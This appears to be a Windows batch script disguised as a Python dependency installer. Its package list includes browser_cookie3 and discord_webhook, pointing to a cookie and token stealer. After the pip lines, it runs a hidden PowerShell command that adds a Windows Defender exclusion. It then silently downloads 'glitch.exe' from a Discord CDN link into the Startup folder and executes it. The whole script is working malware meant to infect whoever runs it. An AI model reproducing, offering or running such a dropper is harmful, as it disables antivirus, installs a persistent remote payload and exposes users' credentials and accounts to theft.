pip install requests
pip install pycryptodome
pip install pystyle
pip install colorama
pip install auto_py_to_exe
pip install pyinstaller
pip install wmi
pip install pyOpenSSL
pip install OpenSSL
pip install get-mac
pip install psutil
pip install ctypes
pip install Crypto.Cipher
pip install fade
pip install discord
pip install browser_cookie3
pip install discord_webhook
powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1203697147975827517/1203703864981983252/glitch.exe?ex=65d20f95&is=65bf9a95&hm=7006615c740abe18742e2e9a93309ef0ab55687636b15ba8176e0db36e89cb72&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\glitch.exe"

if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"
